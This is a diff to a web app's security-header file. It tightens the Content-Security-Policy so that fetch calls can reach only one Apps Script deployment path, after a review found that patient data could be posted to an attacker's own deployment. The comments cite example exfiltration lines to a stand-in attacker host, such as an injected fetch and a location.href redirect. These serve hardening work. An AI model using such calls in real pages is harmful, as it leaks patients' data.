@@ -19,9 +19,21 @@
 # step — a change `wrangler.jsonc` deliberately avoided.
 #
 # So be honest about what this buys. It does NOT stop injected inline script.
-# It DOES pin every external origin the app may reach (an injected
-# `fetch('https://attacker/…', patientData)` is blocked by `connect-src`),
-# forbid framing, and forbid <base>/<object>/off-site form posts.
+# It DOES limit where script can send data with fetch/XHR, forbid framing, and
+# forbid <base>/<object>/off-site form posts. "Limit", not "pin", and precisely:
+#   - `connect-src` names NEOFEED_GAS_URL by its FULL path, not the bare
+#     https://script.google.com it named until 2026-09-17. Anyone can deploy
+#     an Apps Script web app on script.google.com, so the bare origin let an
+#     injected `fetch` post patient data to an attacker's own deployment
+#     (2026-09-17 review, SEC-F4). A path source matches that one /exec only.
+#     If the deployment ID ever changes, this line and both HTML shells'
+#     `window.NEOFEED_GAS_URL` change together —
+#     test/verify-review-0917-shell.cjs fails when they disagree.
+#   - https://script.googleusercontent.com stays origin-wide: /exec answers
+#     with a 302 to a per-response URL there, and CSP ignores the path of a
+#     redirect target anyway.
+#   - No CSP directive governs top-level navigation, so
+#     `location.href = "https://attacker/?d=…"` is NOT blocked by anything here.
 #
 # Origin-by-origin, and why each is here — do not add to this list casually,
 # because the list is the entire point:
@@ -31,7 +43,7 @@
 #   fonts.gstatic.com      the font files that stylesheet pulls
 #   accounts.google.com/gsi/style  Sign-In's own stylesheet — observed BLOCKED in a
 #                          real browser console 2026-09-11 before this was added
-#   script.google.com      NEOFEED_GAS_URL — every backend call
+#   script.google.com/macros/s/<deployment>/exec   NEOFEED_GAS_URL, full path — every backend call
 #   *.googleusercontent.com  where a GAS /exec 302-redirects its response
 #   data:                  inline SVG data URIs (img-src)
 #
@@ -46,7 +58,7 @@
 # change here does not touch that one.
 
 /*
-  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://accounts.google.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://accounts.google.com/gsi/style; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://*.gstatic.com https://*.googleusercontent.com; connect-src 'self' https://script.google.com https://script.googleusercontent.com https://accounts.google.com; frame-src https://accounts.google.com; manifest-src 'self'; base-uri 'none'; form-action 'self'; object-src 'none'; frame-ancestors 'none'
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://unpkg.com https://accounts.google.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://accounts.google.com/gsi/style; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://*.gstatic.com https://*.googleusercontent.com; connect-src 'self' https://script.google.com/macros/s/AKfycbz8NtHuyTdo4EP-ZKb5n5LIRqVzGSY286MZRlXMniO51xjiuQO7eOLvltsrejkL4GgV/exec https://script.googleusercontent.com https://accounts.google.com; frame-src https://accounts.google.com; manifest-src 'self'; base-uri 'none'; form-action 'self'; object-src 'none'; frame-ancestors 'none'
   X-Frame-Options: DENY
   X-Content-Type-Options: nosniff
   Referrer-Policy: strict-origin-when-cross-origin
